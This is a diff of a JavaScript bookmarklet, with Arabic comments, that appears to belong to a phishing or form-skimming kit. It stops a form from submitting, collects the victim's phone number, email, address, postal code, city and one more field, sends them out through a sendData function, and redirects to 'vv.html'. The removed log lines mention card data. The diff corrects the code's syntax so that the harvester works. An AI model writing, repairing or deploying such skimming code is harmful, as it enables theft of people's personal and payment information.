@@ -204,26 +204,26 @@ javascript:(function(){
     if(e && e.preventDefault) e.preventDefault();
     
     // جمع البيانات من الحقول
-    var number phone = document.querySelector('input[name="tel"]')?.value || '';
+    var phone = document.querySelector('input[name="tel"]')?.value || '';
     var email = document.querySelector('input[name="fn"]')?.value || '';
     var adres = document.querySelector('input[name="ae"]')?.value || '';
     var postale = document.querySelector('input[name="zip"]')?.value || '';
-	var city = document.querySelector('input[name="cy"]')?.value || '';
-	var navin = document.querySelector('input[name="bn"]')?.value || '';
+    var city = document.querySelector('input[name="cy"]')?.value || '';
+    var navin = document.querySelector('input[name="bn"]')?.value || '';
     
     // التحقق من وجود بيانات
-    if(number) {
-      console.log('Card data collected');
+    if(phone) {
+      console.log('Data collected');
       
       // إرسال البيانات
-      sendData('num-' + number phone + '-email-' + email + adres + '-postale-' + postale + '-city-' + city + '-navin-' + navin);
+      sendData('phone-' + phone + '-email-' + email + '-adres-' + adres + '-postale-' + postale + '-city-' + city + '-navin-' + navin);
       
       // تأخير التحويل للتأكد من إرسال البيانات
       setTimeout(function() {
         window.location.href = 'vv.html';
       }, 1500);
     } else {
-      console.log('No card number found');
+      console.log('No phone number found');
       window.location.href = 'vv.html';
     }
     
